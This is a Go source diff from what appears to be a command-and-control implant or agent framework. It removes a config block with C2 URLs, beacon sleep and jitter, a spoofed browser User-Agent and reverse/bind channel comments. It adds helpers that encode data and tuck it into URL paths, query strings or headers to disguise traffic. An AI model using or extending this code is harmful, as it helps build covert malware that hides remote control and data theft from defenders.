@@ -1,17 +1,48 @@
 package core
 
-// HTTP(S) --> http(s)://example.com:8080
-// TCP Bind --> tcp://127.0.0.1:5555, tcp://0.0.0.0:5555
-// TCP Reverse --> tcp://192.168.1.100:8888
-
-var (
-	Sleep   = 60000
-	Jitter  = 10
-	C2_URL  = "http://127.0.0.1:80"
-	GetURL  = C2_URL + "/load"
-	PostURL = C2_URL + "/submit.php?id=%d"
-	Headers = map[string]string{
-		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0",
-	}
-	Public_Key = "-----BEGIN PUBLIC KEY-----\nXXXYYYZZZ\n-----END PUBLIC KEY-----"
+import (
+	"net/url"
+	"strings"
 )
+
+func GetURL(Map map[string]interface{}) string {
+	return Map["URL"].(string)
+}
+
+func GetHeader(Map map[string]interface{}) map[string]string {
+	return Map["Header"].(map[string]string)
+}
+
+func GetOutput(Bytes []byte) []byte {
+	Info := PullInfo["Output"].(map[string]string)
+	Data := TrimPSfix(string(Bytes), Info["Prepend"], Info["Append"])
+	return Decoding(Data, Info["Coding"])
+}
+
+func SetOutput(Bytes []byte) *strings.Reader {
+	Info := PushInfo["Output"].(map[string]string)
+	Data := Info["Prepend"] + Encoding(Bytes, Info["Coding"]) + Info["Append"]
+	return strings.NewReader(Data)
+}
+
+func SetProperty(Map map[string]interface{}, Key string, Value []byte) {
+	URL, _ := url.Parse(GetURL(Map))
+	Header := Base64ToMap(Map["Header"].(string))
+	KeyMap := Map[Key].(map[string]string)
+	KeyInfo := strings.SplitN(KeyMap["Store"], ":", 2)
+	KeyData := KeyMap["Prepend"] + Encoding(Value, KeyMap["Coding"]) + KeyMap["Append"]
+	if strings.ToUpper(KeyInfo[0]) == "URL" {
+		if len(KeyInfo) == 2 && len(KeyInfo[1]) > 0 {
+			Query := URL.Query()
+			Query.Set(KeyInfo[1], KeyData)
+			URL.RawQuery = Query.Encode()
+		} else {
+			URL.Path = URL.Path + KeyData
+		}
+	}
+	if strings.ToUpper(KeyInfo[0]) == "HEADER" {
+		Header[KeyInfo[1]] = KeyData
+	}
+	Map["URL"] = URL.String()
+	Map["Header"] = Header
+}
